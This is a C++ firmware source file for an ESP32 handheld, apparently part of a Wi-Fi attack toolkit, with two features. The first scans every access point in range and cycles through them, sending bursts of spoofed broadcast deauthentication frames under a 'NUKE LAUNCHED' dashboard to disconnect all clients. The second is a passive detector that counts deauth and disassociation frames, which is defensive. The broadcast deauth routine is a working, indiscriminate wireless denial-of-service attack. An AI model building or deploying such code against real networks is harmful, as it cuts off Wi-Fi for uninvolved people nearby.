/*
 * wifi_deauth_extras — broadcast deauth (kick ALL clients on an AP at
 * once) and passive deauth detector.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "wifi_types.h"
#include "wifi_deauth_frame.h"
#include <WiFi.h>
#include <esp_wifi.h>

/* ========== Broadcast deauth: nuke every AP in range ========== */

#define DB_MAX_APS 48

struct db_target_t { uint8_t bssid[6]; uint8_t channel; char ssid[24]; };
static db_target_t s_b_targets[DB_MAX_APS];
static volatile int s_b_target_n = 0;
static volatile int s_b_cursor = 0;
static volatile bool     s_b_running = false;
static volatile uint32_t s_b_sent    = 0;
static volatile uint32_t s_b_errs    = 0;
static uint16_t          s_b_seq     = 0;

static void broad_task(void *)
{
    /* Rotate through every AP: hop channel, spoof STA MAC to BSSID,
     * blast a burst of deauths, move on. Spoofing per-AP is expensive
     * (stop/set/start) but necessary — each AP has its own BSSID and
     * the blob's sanity check wants addr2 == STA MAC per frame. */
    wifi_silent_ap_begin(1);
    while (s_b_running) {
        if (s_b_target_n == 0) { delay(100); continue; }
        const db_target_t &t = s_b_targets[s_b_cursor % s_b_target_n];
        /* Hop channel only — the AP interface stays up. */
        esp_wifi_set_channel(t.channel ? t.channel : 1, WIFI_SECOND_CHAN_NONE);
        for (int i = 0; i < 16 && s_b_running; ++i) {
            int ok = wifi_deauth_broadcast(t.bssid, &s_b_seq);
            s_b_sent += ok;
            s_b_errs += (2 - ok);
            delay(6);
        }
        s_b_cursor++;
    }
    wifi_silent_ap_end();
    vTaskDelete(nullptr);
}

static void db_scan_populate(void)
{
    s_b_target_n = 0;
    int n = WiFi.scanNetworks(false, true, false, 120);
    if (n <= 0) return;
    for (int i = 0; i < n && s_b_target_n < DB_MAX_APS; ++i) {
        db_target_t &t = s_b_targets[s_b_target_n++];
        memcpy(t.bssid, WiFi.BSSID(i), 6);
        t.channel = WiFi.channel(i);
        strncpy(t.ssid, WiFi.SSID(i).c_str(), sizeof(t.ssid) - 1);
        t.ssid[sizeof(t.ssid) - 1] = '\0';
    }
    WiFi.scanDelete();
}

void feat_wifi_deauth_broadcast(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);

    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_WARN, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("NUKING ALL APs");
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y + 20); d.print("scanning 2.4 GHz...");
    ui_draw_footer("scanning");
    ui_radar(SCR_W / 2, BODY_Y + 60, 24, T_ACCENT);

    db_scan_populate();
    if (s_b_target_n == 0) {
        ui_toast("no APs found", T_BAD, 1500);
        return;
    }

    esp_wifi_set_promiscuous(true);
    s_b_sent = 0;
    s_b_errs = 0;
    s_b_cursor = 0;
    s_b_seq = (uint16_t)(esp_random() & 0x0FFF);
    s_b_running = true;
    xTaskCreate(broad_task, "deauth_all", 3072, nullptr, 4, nullptr);

    /* Permanent NUKE dashboard — the intro splash aesthetic kept as the
     * live view. Glitch field + scan lines + 3x halo headline + bottom
     * stats ribbon. Updates every 200 ms while frames fly. No more
     * boring text-on-gradient dashboard under the splash. */
    uint32_t last = 0;
    uint32_t last_sent = 0;
    uint16_t color = T_ACCENT2;

    while (true) {
        uint32_t now = millis();

        if (now - last > 200) {
            last = now;
            int cur = s_b_target_n ? (s_b_cursor % s_b_target_n) : 0;

            /* Full redraw — cheap at 5 Hz and lets the glitch field
             * actually flicker. */
            d.fillScreen(0x0000);
            ui_glitch(0, 0, SCR_W, SCR_H);
            for (int y = 0; y < SCR_H; y += 4) {
                d.drawFastHLine(0, y, SCR_W, 0x0020);
            }

            /* Big halo headline — same draw as ui_action_overlay. */
            const char *headline = "NUKE LAUNCHED";
            d.setTextSize(3);
            int hw = d.textWidth(headline) * 3;
            int hx = (SCR_W - hw) / 2;
            int hy = 22;
            d.setTextColor(0xF81F, 0);
            d.setCursor(hx - 2, hy); d.print(headline);
            d.setCursor(hx + 2, hy); d.print(headline);
            d.setCursor(hx, hy - 2); d.print(headline);
            d.setCursor(hx, hy + 2); d.print(headline);
            d.setTextColor(0xFFFF, 0);
            d.setCursor(hx, hy); d.print(headline);
            d.setTextSize(1);

            /* Animated side brackets. */
            int bl = 10 + (int)(sinf(now * 0.01f) * 4);
            d.drawFastHLine(4, hy - 6, bl, color);
            d.drawFastVLine(4, hy - 6, 4, color);
            d.drawFastHLine(4, hy + 28, bl, color);
            d.drawFastVLine(4, hy + 25, 4, color);
            d.drawFastHLine(SCR_W - 4 - bl, hy - 6, bl, color);
            d.drawFastVLine(SCR_W - 5, hy - 6, 4, color);
            d.drawFastHLine(SCR_W - 4 - bl, hy + 28, bl, color);
            d.drawFastVLine(SCR_W - 5, hy + 25, 4, color);

            /* Live stats ribbon — bottom third of the screen. */
            uint32_t fps = (s_b_sent - last_sent) * 5;
            last_sent = s_b_sent;

            /* Target line (big). */
            const db_target_t &t = s_b_targets[cur];
            d.setTextColor(T_ACCENT2, 0);
            d.setCursor(4, SCR_H - 44);
            d.printf("-> %.20s", t.ssid[0] ? t.ssid : "<hidden>");

            /* Target detail line (dim). */
            d.setTextColor(0x8410, 0);   /* mid gray, readable on glitch */
            d.setCursor(4, SCR_H - 34);
            d.printf("ch%u %02X:%02X:%02X:%02X:%02X:%02X",
                     t.channel,
                     t.bssid[0], t.bssid[1], t.bssid[2],
                     t.bssid[3], t.bssid[4], t.bssid[5]);

            /* Frames + rate (big, bright). */
            char stats[48];
            snprintf(stats, sizeof(stats), "%lu frames  %lu/s",
                     (unsigned long)s_b_sent, (unsigned long)fps);
            d.setTextColor(fps > 40 ? 0x07E0 : 0xFFE0, 0);
            int sw = d.textWidth(stats);
            d.setCursor((SCR_W - sw) / 2, SCR_H - 22);
            d.print(stats);

            /* Target count + drops. */
            char meta[32];
            snprintf(meta, sizeof(meta), "%d APs  %lu drop",
                     s_b_target_n, (unsigned long)s_b_errs);
            d.setTextColor(0xFFFF, 0);
            int mw = d.textWidth(meta);
            d.setCursor((SCR_W - mw) / 2, SCR_H - 10);
            d.print(meta);
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
    }
    s_b_running = false;
    delay(150);
    esp_wifi_set_promiscuous(false);
}

/* ========== Deauth detector: passively count deauth frames ========== */

static volatile uint32_t s_det_count = 0;
static volatile uint32_t s_det_total = 0;
static uint8_t s_det_last_bssid[6] = {0};

static void det_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 26) return;
    uint8_t fc = pkt->payload[0];
    uint8_t subtype = (fc >> 4) & 0xF;
    /* 0xC = deauth, 0xA = disassociation */
    if (subtype == 0xC || subtype == 0xA) {
        s_det_count++;
        s_det_total++;
        memcpy((void *)s_det_last_bssid, pkt->payload + 16, 6);
    }
}

void feat_wifi_deauth_detect(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(det_cb);

    s_det_count = 0;
    s_det_total = 0;
    uint8_t ch = 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    ui_clear_body();
    ui_draw_footer(";/.=channel  `=stop");
    uint32_t last = 0;
    uint32_t window_ms = millis();
    uint32_t window_count = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            if (millis() - window_ms > 1000) {
                window_count = s_det_count;
                s_det_count = 0;
                window_ms = millis();
            }
            auto &d = M5Cardputer.Display;
            ui_clear_body();
            d.setTextColor(T_ACCENT, T_BG);
            d.setCursor(4, BODY_Y + 2); d.print("DEAUTH DETECT");
            d.drawFastHLine(4, BODY_Y + 12, 100, T_ACCENT);
            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 22); d.printf("channel : %u", ch);
            d.setTextColor(window_count > 5 ? T_BAD : T_GOOD, T_BG);
            d.setCursor(4, BODY_Y + 34); d.printf("rate    : %lu/s", (unsigned long)window_count);
            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 46); d.printf("total   : %lu", (unsigned long)s_det_total);
            if (s_det_total > 0) {
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + 60);
                d.printf("last BSSID %02X:%02X:%02X:%02X:%02X:%02X",
                         s_det_last_bssid[0], s_det_last_bssid[1], s_det_last_bssid[2],
                         s_det_last_bssid[3], s_det_last_bssid[4], s_det_last_bssid[5]);
            }
            ui_draw_status(radio_name(), "dauth-det");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == ';' || k == PK_UP)   { if (ch < 13) { ch++; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); } }
        if (k == '.' || k == PK_DOWN) { if (ch > 1)  { ch--; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); } }
    }
    esp_wifi_set_promiscuous(false);
}
